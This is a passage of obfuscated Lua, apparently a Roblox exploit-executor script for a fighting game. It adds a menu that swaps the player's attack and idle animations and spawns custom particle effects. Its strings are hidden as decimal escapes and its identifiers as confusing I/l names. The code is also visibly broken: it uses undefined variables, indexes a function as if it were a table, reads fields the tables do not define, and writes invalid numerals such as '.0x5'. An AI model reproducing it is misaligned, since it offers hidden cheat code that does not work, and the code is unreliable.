"\066\097\108\100","\072\117\110\116\101\114","\080\117\114\112\108\101","\067\121\098\111\114\103", "\078\105\110\106\097","\066\097\116\116\101\114","\066\108\097\100\101","\069\115\112\101\114","\075\074","\084\101\099\104","\076\105\103\104\116\110\105\110\103", } local _llIlIlIIII = { ["\083\097\105\116\097\109\097"]="\066\097\108\100",["\071\097\114\111\117"]="\072\117\110\116\101\114",["\077\111\110\115\116\101\114\032\071\097\114\111\117"]="\077\111\110\115\116\101\114", ["\083\117\105\114\121\117"]="\080\117\114\112\108\101",["\071\101\110\111\115"]="\067\121\098\111\114\103",["\083\111\110\105\099"]="\078\105\110\106\097", ["\077\101\116\097\108\032\066\097\116"]="\066\097\116\116\101\114",["\065\116\111\109\105\099\032\083\097\109\117\114\097\105"]="\066\108\097\100\101", ["\084\097\116\115\117\109\097\107\105"]="\069\115\112\101\114",["\075\074"]="\075\074",["\067\104\105\108\100\032\069\109\112\101\114\111\114"]="\084\101\099\104", ["\076\105\103\104\116\110\105\110\103\032\077\097\120"]="\076\105\103\104\116\110\105\110\103", ["\077\121\032\066\114\111\116\104\101\114"]="\066\114\111\116\104\101\114", ["\069\109\101\114\103\101"]="\069\109\101\114\103\101", ["\090\111\109\098\105\101\032\077\097\110\032\040\065\120\101\041"]="\090\111\109\098\105\101\065\120\101", ["\090\111\109\098\105\101\032\077\097\110\032\040\068\101\097\103\108\101\041"]="\090\111\109\098\105\101\068\101\097\103\108\101", ["\090\111\109\098\105\101\032\077\097\110\032\040\083\104\111\116\103\117\110\041"]="\090\111\109\098\105\101\083\104\111\116\103\117\110", } _IIIIllIlII:AddToggle("\067\117\115\116\111\109\077\049\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\077\049\039\115", Default = false, }) _IIIIllIlII:AddDivider() for _lIlllIlIll = 0x1, 0x4 do local _IlllIIlIlI = _IllIIlIllI if _lIlllIlIll == 0x3 then _IlllIIlIlI = {} for _lllIlllIIl, _lIIIIIIIII in ipairs(_IllIIlIllI) do if _lIIIIIIIII ~= "\069\109\101\114\103\101" then table.insert(_IlllIIlIlI, _lIIIIIIIII) end
 end
 end
 _IIIIllIlII:AddDropdown("\067\117\115\116\111\109\077\049\095\083\108\111\116"..i, { Text = "\077\049\032"..i, Values = _IlllIIlIlI, Default = 0x1, Multi = false, Searchable = false, }) end
 local function _lIlIlIIIIl(_IlIIllIlll) local _llllIIIlIl = _IlIllIIllI["\067\117\115\116\111\109\077\049\095\083\108\111\116"..slot] if not _llllIIIlIl or _llllIIIlIl.Value == "\068\101\102\097\117\108\116" then return nil, nil end
 local _IIIlIlIIlI if _llllIIIlIl.Value == "\082\097\110\100\111\109" then _IIIlIlIIlI = _IIIIllIIII[math.random(0x1, #_IIIIllIIII)] else _IIIlIlIIlI = _llIlIlIIII[_llllIIIlIl.Value] end
 if not _IIIlIlIIlI then return nil, nil end
 local _lIIlIlIIIl = _IlIIlIIlIl[_IIIlIlIIlI] return _lIIlIlIIIl and _lIIlIlIIIl[_IlIIllIlll], _IIIlIlIIlI end
 local _IlIllIlllI = nil local _lllIlIllIl = nil local _IllIlllIll = nil local _IIlIIlIllI = {} local function _lIIlIlIIll() for _lllIlllIIl, _IIlIlIlIII in pairs(_IIlIIlIllI) do pcall( function () if _IIlIlIlIII.IsPlaying then _IIlIlIlIII:Stop() end
 end
 ) end
 table.clear(_IIlIIlIllI) end
 local function _IlIIlIlllI(_IlIIIlIIII) if _IlIllIlllI then _IlIllIlllI:Disconnect() _IlIllIlllI = nil end
 _lIIlIlIIll() _IllIlllIll = _IlIIIlIIII if not _IlIIIlIIII then return end
 _IlIllIlllI = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) if not _IIlIlIIlIl.CustomM1Enabled.Value then return end
 local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" local _lIIlIIIIIl = _IlllIllIII:match("\037\100\043") if not _lIIlIIIIIl then return end
 local _IlIIllIlll = _lIlIlIIIIl[_lIIlIIIIIl] if not _IlIIllIlll then return end
 local _llIIlllIII, _IIIlIlIIlI = _lIlIlIIIIl(_IlIIllIlll) if not _llIIlllIII then return end
 if _llIIlllIII == _lIIlIIIIIl then return end
 _lIIlIlIIll() _llIIllIlIl:AdjustSpeed(0x0) _llIIllIlIl:AdjustWeight(-0x98967F, false) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047"..customId local _IllIlIIIll = _IlIIIlIIII:LoadAnimation(_llllIlIllI) _IIlIIlIllI[#_IIlIIlIllI + 0x1] = _IllIlIIIll _IllIlIIIll.Priority = Enum.AnimationPriority.Action3 _IllIlIIIll:Play(0x0) end
 ) end
 _lllIlIllIl = RunService.Heartbeat:Connect( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII ~= _IllIlllIll then _IlIIlIlllI(_IlIIIlIIII) end
 end
 ) table.insert(_llIlllIlIl, function () if _IlIllIlllI then _IlIllIlllI:Disconnect() _IlIllIlllI = nil end
 if _lllIlIllIl then _lllIlIllIl:Disconnect() _lllIlIllIl = nil end
 _lIIlIlIIll() _IllIlllIll = nil pcall( function () _IIlIlIIlIl.CustomM1Enabled:SetValue(false) end
 ) end
 ) _IIIIllIlII:AddDivider() _IIIIllIlII:AddToggle("\067\117\115\116\111\109\068\111\119\110\115\108\097\109\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\068\111\119\110\115\108\097\109", Default = false, }) _IIIIllIlII:AddDropdown("\067\117\115\116\111\109\068\111\119\110\115\108\097\109\095\065\110\105\109", { Text = "\067\117\115\116\111\109\032\068\111\119\110\115\108\097\109", Values = { "\068\101\102\097\117\108\116", "\082\097\110\100\111\109", "\070\108\105\112", "\068\111\119\110\032\070\097\108\108", "\072\097\114\100\032\080\114\101\115\115", "\085\115\101\108\101\115\115" }, Default = 0x1, Multi = false, Searchable = false, }) local _llIIlIlIII = nil local _IllIIllIll = nil local _IIllIIIIlI = nil local _IlIlllIIlI = { ["\070\108\105\112"] = { _IIIIllIIlI = "\049\055\056\053\057\048\053\053\054\055\049", timePos = 0.1, _lllIlllllI = 2.0 }, ["\068\111\119\110\032\070\097\108\108"] = { _IIIIllIIlI = "\049\055\056\053\056\056\055\056\048\050\055", timePos = 0.25, _lllIlllllI = nil }, ["\072\097\114\100\032\080\114\101\115\115"] = { _IIIIllIIlI = "\049\056\052\054\052\051\053\054\050\051\051", timePos = 0.5, _lllIlllllI = 3.0 }, ["\085\115\101\108\101\115\115"] = { _IIIIllIIlI = "\049\054\053\055\049\057\048\057\057\048\056", timePos = 2.25, _lllIlllllI = 0.75 }, } local function _IIllllIlll(_IlIIIlIIII) if _llIIlIlIII then _llIIlIlIII:Disconnect() _llIIlIlIII = nil end
 _IIllIIIIlI = _IlIIIlIIII if not _IlIIIlIIII then return end
 _llIIlIlIII = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) if not _IIlIlIIlIl.CustomDownslamEnabled.Value then return end
 local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" if not _IlllIllIII:match("\049\048\052\055\048\049\048\052\050\052\050") then return end
 local _llllIIIlIl = _IlIllIIllI.CustomDownslam_Anim and _IlIllIIllI.CustomDownslam_Anim.Value or "\068\101\102\097\117\108\116" if _llllIIIlIl == "\082\097\110\100\111\109" then local _lllllIllll = { "\070\108\105\112", "\068\111\119\110\032\070\097\108\108", "\072\097\114\100\032\080\114\101\115\115", "\085\115\101\108\101\115\115" } _llllIIIlIl = _lllllIllll[math.random(0x1, #_lllllIllll)] end
 local _lIIIlIIllI = _IlIlllIIlI[_llllIIIlIl] if not _lIIIlIIllI then return end
 _llIIllIlIl:AdjustWeight(-0x98967F, false) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lIIIlIIllI.id local _IIlIlIlIII = _IlIIIlIIII:LoadAnimation(_llllIlIllI) _IIlIlIlIII.Priority = Enum.AnimationPriority.Action3 _IIlIlIlIII:Play(0.1) if _lIIIlIIllI.speed then _IIlIlIlIII:AdjustSpeed(_lIIIlIIllI.speed) end
 if _lIIIlIIllI.timePos then _IIlIlIlIII.TimePosition = _lIIIlIIllI.timePos end
 _llIIllIlIl.Stopped:Connect( function () pcall( function () _IIlIlIlIII:Stop(0.25) end
 ) end
 ) end
 ) end
 local _lIlIlIllll = false local function _lllIIIIllI(_IlIIIlIIII) if not _IlIIIlIIII then return end
 _lIlIlIllll = false task.spawn( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IIIIlIIllI = _IlIIIlIIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") or _IlIIIlIIII:WaitForChild("\065\110\105\109\097\116\111\114", 0x5) if not _IIIIlIIllI then return end
 local _IlIIllllll = nil local function _lIIIlIIllI(obj) if obj:IsA("\066\111\100\121\086\101\108\111\099\105\116\121") then obj.Velocity = Vector3.new(obj.Velocity.X, 0x0, obj.Velocity.Z) end
 end
 _IlIIllllll = _IIllllIlII.DescendantAdded:Connect(_lIIIlIIllI) for _lllIlllIIl, _IlIllllIII in pairs(_IIllllIlII:GetDescendants()) do _lIIIlIIllI(_IlIllllIII) end
 if _IlIIllllll then _IlIIllllll:Disconnect() _IlIIllllll = nil end
 _lIlIlIllll = true end
 ) end
 _IllIIllIll = RunService.Heartbeat:Connect( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII ~= _IIllIIIIlI then _IIllllIlll(_IlIIIlIIII) _lllIIIIllI(_IlIIIlIIII) end
 end
 ) task.spawn( function () local _IIllllIlII = _llIIIlIIll.Character or _llIIIlIIll.CharacterAdded:Wait() local _IlIIIlIIII = _IIllllIlII and (_IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x3)) if _IlIIIlIIII then _lllIIIIllI(_IlIIIlIIII) end
 end
 ) table.insert(_llIlllIlIl, function () if _llIIlIlIII then _llIIlIlIII:Disconnect() _llIIlIlIII = nil end
 if _IllIIllIll then _IllIIllIll:Disconnect() _IllIIllIll = nil end
 _IIllIIIIlI = nil pcall( function () _IIlIlIIlIl.CustomDownslamEnabled:SetValue(false) end
 ) end
 ) _IIIIllIlII:AddDivider() _IIIIllIlII:AddToggle("\067\117\115\116\111\109\085\112\112\101\114\099\117\116\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\085\112\112\101\114\099\117\116", Default = false, }) local _IlllIlIlIl = { { _IlIIIIIlll = "\084\104\114\111\119", _IIIIllIIlI = "\049\051\054\051\055\048\055\051\055\054\051\051\054\052\057", timePos = 0x1, _lllIlllllI = 1.2, stopAfter = 0.3, stopFade = 0x1 }, { _IlIIIIIlll = "\072\101\097\118\121", _IIIIllIIlI = "\049\052\057\048\048\049\054\056\055\050\048", timePos = 1.3, _lllIlllllI = 0x1, stopAfter = nil }, { _IlIIIIIlll = "\083\105\109\112\108\101", _IIIIllIIlI = "\049\050\057\049\050\051\057\054\048\055\052\050\052\051\056", timePos = 2.8, _lllIlllllI = nil, stopAfter = nil, stopFade = 0.2 }, { _IlIIIIIlll = "\066\097\108\108\032\077\105\103\104\116", _IIIIllIIlI = "\049\050\053\050\054\053\052\053\057\056\056\054\056\054\051", timePos = 5.20, _lllIlllllI = 1.3, stopAfter = nil, stopTrigger = 6.15, stopFade = 0.2 }, } local _IIIlllIIlI = { "\068\101\102\097\117\108\116", "\082\097\110\100\111\109" } for _lllIlllIIl, _lIIIIIIIII in ipairs(_IlllIlIlIl) do table.insert(_IIIlllIIlI, _lIIIIIIIII.name) end
 _IIIIllIlII:AddDropdown("\067\117\115\116\111\109\085\112\112\101\114\099\117\116\095\065\110\105\109", { Text = "\067\117\115\116\111\109\032\085\112\112\101\114\099\117\116", Values = _IIIlllIIlI, Default = 0x1, Multi = false, Searchable = false, }) local _IlllllIlII = nil local _IIIlllIlII = nil local _IIIIIlIIll = nil local function _IlIIIIIlll(_IlIIIlIIII) if _IlllllIlII then _IlllllIlII:Disconnect() _IlllllIlII = nil end
 _IIIIIlIIll = _IlIIIlIIII if not _IlIIIlIIII then return end
 _IlllllIlII = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) local _IIIIllIIlI = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId:match("\037\100\043") or "" if _IIIIllIIlI ~= "\049\048\053\048\051\051\056\049\050\051\056" then return end
 local _IlllIIIlll = _IlIllIIllI.M1EffectsStyle and _IlIllIIllI.M1EffectsStyle.Value if _IlllIIIlll and _IlllIIIlll ~= "\079\102\102" then task.spawn( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _llIIIIIIIl = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _llIIIIIIIl then return end
 local _lIlllIIIlI = OverlapParams.new() _lIlllIIIlI.FilterType = Enum.RaycastFilterType.Exclude _lIlllIIIlI.FilterDescendantsInstances = { _IIllllIlII } local _lIlIlIIlIl = workspace:GetPartBoundsInRadius( (_llIIIIIIIl.CFrame * CFrame.new(0x0, 0x0, -2.5)).Position, 0x6, _lIlllIIIlI ) local _IlIIlIllll = nil for _lllIlllIIl, _llIIIIlllI in pairs(_lIlIlIIlIl) do if _llIIIIlllI.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") and _llIIIIlllI.Parent.Name ~= _llIIIlIIll.Name then _IlIIlIllll = _llIIIIlllI.Parent end
 end
 if not _IlIIlIllll then return end
 local _lIIIllIlll = _IlIIlIllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIIIllIlll then return end
 local _lIIllIIIIl = _lIIIllIlll.Health local _lllIlIlIII = nil _lllIlIlIII = _lIIIllIlll:GetPropertyChangedSignal("\072\101\097\108\116\104"):Connect( function () if _lIIIllIlll.Health < _lIIllIIIIl then if _lllIlIlIII then _lllIlIlIII:Disconnect() _lllIlIlIII = nil end
 local _llllIllIIl = _IlIIlIllll:FindFirstChild("\084\111\114\115\111") if not _llllIllIIl then return end
 local _IlllIlllll = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):FindFirstChild("\082\101\115\111\117\114\099\101\115") if not _IlllIlllll then return end
 local _llIIIIllll = Instance.new("\083\111\117\110\100", _llllIllIIl) _llIIIIllll.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\048\054\052\050\050\051\051\057\057" _llIIIIllll.Volume = _m1FxVol() _llIIIIllll.PlayOnRemove = true _llIIIIllll:Destroy() local _llIIlIllIl = _IlllIlllll.KJEffects.DropkickExtra.firstHit:Clone() for _lllIlllIIl, desc in pairs(_llIIlIllIl:GetDescendants()) do if desc:IsA("\066\097\115\101\080\097\114\116") then desc.CanCollide = false desc.Anchored = true desc.Massless = true end
 end
 if _llIIlIllIl:IsA("\066\097\115\101\080\097\114\116") then _llIIlIllIl.CanCollide = false _llIIlIllIl.Anchored = true _llIIlIllIl.Massless = true end
 _llIIlIllIl.Parent = workspace _llIIlIllIl.CFrame = _llllIllIIl.CFrame local _IIIllIIlll = nil for _lllIlllIIl, desc in pairs(_llIIlIllIl:GetDescendants()) do if desc.Name == "\087\105\110\100" then _IIIllIIlll = desc.Parent end
 end
 if _IIIllIIlll then _IIIllIIlll.Wind:Emit(0x1E) end
 game:GetService("\068\101\098\114\105\115"):AddItem(_llIIlIllIl, 0x2) end
 _lIIllIIIIl = _lIIIllIlll.Health end
 ) task.delay(0x1, function () if _lllIlIlIII then _lllIlIlIII:Disconnect() _lllIlIlIII = nil end
 end
 ) end
 ) end
 if not _IIlIlIIlIl.CustomUppercutEnabled.Value then return end
 local _llllIIIlIl = _IlIllIIllI.CustomUppercut_Anim and _IlIllIIllI.CustomUppercut_Anim.Value or "\068\101\102\097\117\108\116" if _llllIIIlIl == "\068\101\102\097\117\108\116" then return end
 local _lIIIlIIllI = nil if _llllIIIlIl == "\082\097\110\100\111\109" then _lIIIlIIllI = _IlllIlIlIl[math.random(0x1, #_IlllIlIlIl)] else for _lllIlllIIl, _lIIIIIIIII in ipairs(_IlllIlIlIl) do if _lIIIIIIIII.name == _llllIIIlIl then _lIIIlIIllI = _lIIIIIIIII break end
 end
 end
 if not _lIIIlIIllI then return end
 _llIIllIlIl:AdjustWeight(-0x98967F, false) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lIIIlIIllI.id local _IIlIlIlIII = _IlIIIlIIII:LoadAnimation(_llllIlIllI) _IIlIlIlIII.Priority = Enum.AnimationPriority.Action3 _IIlIlIlIII:Play(0.1) if _lIIIlIIllI.speed then _IIlIlIlIII:AdjustSpeed(_lIIIlIIllI.speed) end
 if _lIIIlIIllI.timePos then _IIlIlIlIII.TimePosition = _lIIIlIIllI.timePos end
 if _lIIIlIIllI.stopTrigger then local _lIIlIlIIll _lIIlIlIIll = RunService.Heartbeat:Connect( function () if not _IIlIlIlIII.IsPlaying or _IIlIlIlIII.TimePosition >= _lIIIlIIllI.stopTrigger then if _lIIlIlIIll then _lIIlIlIIll:Disconnect() _lIIlIlIIll = nil end
 pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0x0) end
 ) end
 end
 ) elseif _lIIIlIIllI.stopAfter then task.delay(_lIIIlIIllI.stopAfter, function () pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0x0) end
 ) end
 ) else _llIIllIlIl.Stopped:Once( function () pcall( function () _IIlIlIlIII:Stop(_lIIIlIIllI.stopFade or 0x0) end
 ) end
 ) end
 end
 ) end
 _IIIlllIlII = RunService.Heartbeat:Connect( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII ~= _IIIIIlIIll then _IlIIIIIlll(_IlIIIlIIII) end
 end
 ) table.insert(_llIlllIlIl, function () if _IlllllIlII then _IlllllIlII:Disconnect() _IlllllIlII = nil end
 if _IIIlllIlII then _IIIlllIlII:Disconnect() _IIIlllIlII = nil end
 _IIIIIlIIll = nil pcall( function () _IIlIlIIlIl.CustomUppercutEnabled:SetValue(false) end
 ) end
 ) end
 local TweenService = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _IIlllIlIll = _llIIIlIIII local _lIlIlIIIlI = { "\078\111\114\109\097\108","\082\097\110\100\111\109", "\091\068\069\070\093\032\087\097\116\099\104","\091\068\069\070\093\032\067\097\115\117\097\108","\091\068\069\070\093\032\067\111\110\102\105\100\101\110\116","\091\068\069\070\093\032\070\101\110\116\032\077\097\115\116\101\114","\091\068\069\070\093\032\070\108\121\032\073\100\108\101", "\091\068\069\070\093\032\065\117\114\097","\091\068\069\070\093\032\083\101\114\105\111\117\115","\091\068\069\070\093\032\082\101\119\111\114\107","\091\068\069\070\093\032\080\114\101\112\097\114\105\110\103","\091\068\069\070\093\032\068\105\118\105\110\101","\091\068\069\070\093\032\071\111\100", "\091\083\071\093\032\077\097\121\104\101\109","\091\083\071\093\032\082\097\105\110\098\111\119","\091\083\071\093\032\090\121\108\101\100\111\110", "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101","\091\083\071\093\032\080\117\114\105\116\121","\091\083\071\093\032\069\117\099\108\105\100\101\097\110", "\091\083\071\093\032\069\113\117\105\110\111\120","\091\083\071\093\032\067\114\097\122\101\100","\091\083\071\093\032\084\104\101\032\066\105\103\032\066\108\097\099\107", "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116", } _IIlllIlIll:AddDropdown("\073\100\108\101\065\110\105\109\097\116\105\111\110", { Values = _lIlIlIIIlI, Default = 0x1, Multi = false, Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110", Searchable = true, }) _IIlllIlIll:AddSlider("\073\100\108\101\065\110\105\109\097\116\105\111\110\083\116\097\114\116\070\097\100\101\084\105\109\101", { Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110\032\083\116\097\114\116\032\070\097\100\101\032\084\105\109\101", Default = 0.2, Min = 0.1, Max = 0x1, Rounding = 0x2, }) _IIlllIlIll:AddSlider("\073\100\108\101\065\110\105\109\097\116\105\111\110\069\110\100\070\097\100\101\084\105\109\101", { Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110\032\069\110\100\032\070\097\100\101\032\084\105\109\101", Default = 0.2, Min = 0.1, Max = 0x1, Rounding = 0x2, }) local _lIlIIIlllI _IIlllIlIll:AddToggle("\083\071\086\070\088\084\111\103\103\108\101", { Text = "\069\110\097\098\108\101\032\083\071\032\086\070\088", Default = false, Callback = function () if _lIlIIIlllI then _lIlIIIlllI() end
 end
 , }) local _IIlIIlIIII = nil local _IlIlIllllI = nil local _lllIllllIl = nil local _IlIIIIlIIl = nil local _IlIIIlIllI = nil local _IllIIlIIlI = nil local _IlllIlIlII = nil local _lIIlIlIllI = false local _lllIllIIII = 0x0 local _lllllIlllI = "" local _IIIIllllII = "" local _lIllIllIlI = false local _lIlIIllIll = 0x0 local _llllIlllIl = false local _IIllllIlII = nil local _lIIlllIIlI = nil local function _llIIIIllIl() return (getgenv().Enviroment and pcall( function () return getgenv().Enviroment.Parent end
 ) and getgenv().Enviroment) or workspace end
 local function _llIllllllI() return (getgenv().music and getgenv().music.PlaybackLoudness) or 0x0 end
 local _IIllIlllII = { MODE_NAME = true, Text = true } local function _IlIlllIlll(_IIIlIlllll) if not _IIIlIlllll then return end
 for _lllIlllIIl, _IlIllllIII in pairs(_IIIlIlllll:GetDescendants()) do if _IlIllllIII:IsA("\066\105\108\108\098\111\097\114\100\071\117\105") and _IIllIlllII[_IlIllllIII.Name] then pcall( function () _IlIllllIII:Destroy() end
 ) end
 end
 end
 local function _llIlIIIlIl(_IIIlIlllll) _IlIlllIlll(_IIIlIlllll) if _IIllllIlII then _IIllllIlII:Disconnect() _IIllllIlII = nil end
 if not _IIIlIlllll then return end
 _IIllllIlII = _IIIlIlllll.DescendantAdded:Connect( function (obj) if obj:IsA("\066\105\108\108\098\111\097\114\100\071\117\105") and _IIllIlllII[obj.Name] then pcall( function () obj:Destroy() end
 ) end
 end
 ) end
 local function _llIlllIlII() return type(_IIIIllllII) == "\115\116\114\105\110\103" and _IIIIllllII:sub(0x1,0x4) == "\091\083\071\093" end
 local function _lIlIllIIlI(idleName, _lllllIIIll) local _IIIlIlIIlI = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _llIllIlIlI = game:GetService("\068\101\098\114\105\115") local function _llIIlIIllI() return _lIlIIllIll == _lllllIIIll end
 local function _lIIIIIIllI() local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") return _IIIlIlllll, _IlIIIIlIIl end
 if idleName == "\091\083\071\093\032\080\101\114\115\105\115\116\101\110\099\101" then local _IlIlIlIlIl = 0x0; local _lIlllIlIll = 0x0 while _llIIlIIllI() do _lIlllIlIll = _lIlllIlIll + 0x1; _IlIlIlIlIl = _IlIlIlIlIl + .0x5 local _IIllllIlII, _llIIIIIIIl = _lIIIIIIllI() if not _IIllllIlII or not _llIIIIIIIl then task.wait(.0x5) continue end
 local _lIIlllIIll = _IIllllIlII:FindFirstChild("\082\105\103\104\116\032\065\114\109") if not _lIIlllIIll then task.wait(.0x5) continue end
 spawn( function () local _IIIIIlIlll=Instance.new("\080\097\114\116"); _IIIIIlIlll.Parent=_llIIIIllIl() _IIIIIlIlll.Material=Enum.Material.Neon; _IIIIIlIlll.Size=Vector3.new(0x1,0x1,0x1) _IIIIIlIlll.Anchored=true; _IIIIIlIlll.CanCollide=false local _IIIIlIIIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_IIIIIlIlll); _IIIIlIIIII.MeshType="\083\112\104\101\114\101" _IIIIIlIlll.CFrame=_lIIlllIIll.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(0x0,_lIlllIlIll/0x5,math.rad(0x5A)) _IIIIIlIlll.Color=Color3.new(0x0,0x0,0x1); _IIIIlIIIII.Scale=Vector3.new(0x1,0x1,0x1) _llIllIlIlI:AddItem(_IIIIIlIlll,1.5) _IIIlIlIIlI:Create(_IIIIIlIlll,TweenInfo.new(.0x6),{CFrame=_IIIIIlIlll.CFrame*CFrame.new(0x0,0x2,0x0),Transparency=0x1,Color=Color3.new(0x0,.0x3,.0x3)}):Play() _IIIlIlIIlI:Create(_IIIIlIIIII,TweenInfo.new(.0x6),{Scale=Vector3.new(0x0,0x1,0x0)}):Play() local _lIIIlIlIll=Instance.new("\080\097\114\116"); _lIIIlIlIll.Parent=_llIIIIllIl() _lIIIlIlIll.Material=Enum.Material.Neon; _lIIIlIlIll.Size=Vector3.new(0x1,0x1,0x1) _lIIIlIlIll.Anchored=true; _lIIIlIlIll.CanCollide=false local _IIlIlIlllI=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIlIlIll); _IIlIlIlllI.MeshType="\083\112\104\101\114\101" _lIIIlIlIll.CFrame=_lIIlllIIll.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(0x0,math.rad(0xB4)+_lIlllIlIll/0x5,math.rad(0x5A)) _lIIIlIlIll.Color=Color3.new(0x0,0x0,0x1); _IIlIlIlllI.Scale=Vector3.new(0x1,0x1,0x1) _llIllIlIlI:AddItem(_lIIIlIlIll,1.5) _IIIlIlIIlI:Create(_lIIIlIlIll,TweenInfo.new(.0x6),{CFrame=_lIIIlIlIll.CFrame*CFrame.new(0x0,0x2,0x0),Transparency=0x1,Color=Color3.new(0x0,.0x3,.0x3)}):Play() _IIIlIlIIlI:Create(_IIlIlIlllI,TweenInfo.new(.0x6),{Scale=Vector3.new(0x0,0x1,0x0)}):Play() if _IlIlIlIlIl >= 0x5 then _IlIlIlIlIl = 0x0 local _lIIIIIIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIlIlIll) _lIIIIIIIII.LightEmission=0xF; _lIIIIIIIII.LightInfluence=0x1; _lIIIIIIIII.Size=NumberSequence.new(0x2,0x0) _lIIIIIIIII.Name="\095\082\115\109\111\107\101"; _lIIIIIIIII.Transparency=NumberSequence.new(0x1,0x0,0x1); _lIIIIIIIII.Lifetime=NumberRange.new(1.4) _lIIIIIIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0xF,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _lIIIIIIIII.Rate=0x0; _lIIIIIIIII.Speed=NumberRange.new(0x1); _lIIIIIIIII:Emit() _lIIIIIIIII.SpreadAngle=Vector2.new(0x1E,0x1E); _lIIIIIIIII.Rotation=NumberRange.new(0x1,0x168); _lIIIIIIIII.RotSpeed=NumberRange.new(-0x64,0x64) _lIIIIIIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\057\052\055\048\054\053\057\056\057\057"; _lIIIIIIIII.Brightness=0x9FB _lIIIIIIIII.LightEmission=0xA; _lIIIIIIIII.LightInfluence=0x0; _lIIIIIIIII.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108" _lIIIIIIIII.FlipbookFramerate=NumberRange.new(0x42); _lIIIIIIIII.FlipbookLayout="\071\114\105\100\056\120\056"; _lIIIIIIIII.FlipbookMode="\076\111\111\112"; _lIIIIIIIII.ZOffset=-0x2 end
 local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIlIlIll) _IIllIIIlll.LightEmission=0x37; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\050\056\052\050\048\053\052\048\051" _IIllIIIlll.Color=ColorSequence.new(Color3.new(0x1,0x1,0x1)); _IIllIIIlll.Rate=0x0; _IIllIIIlll:Emit(0x2) _IIllIIIlll.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108"; _IIllIIIlll.Lifetime=NumberRange.new(0x1) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x0),NumberSequenceKeypoint.new(.0x5,0x1),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x0),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _IIllIIIlll.Speed=NumberRange.new(.0x1); _IIllIIIlll.VelocitySpread=0x0; _IIllIIIlll.ZOffset=0x5 _IIllIIIlll.LockedToPart=true; _IIllIIIlll.Rotation=NumberRange.new(0x5A); 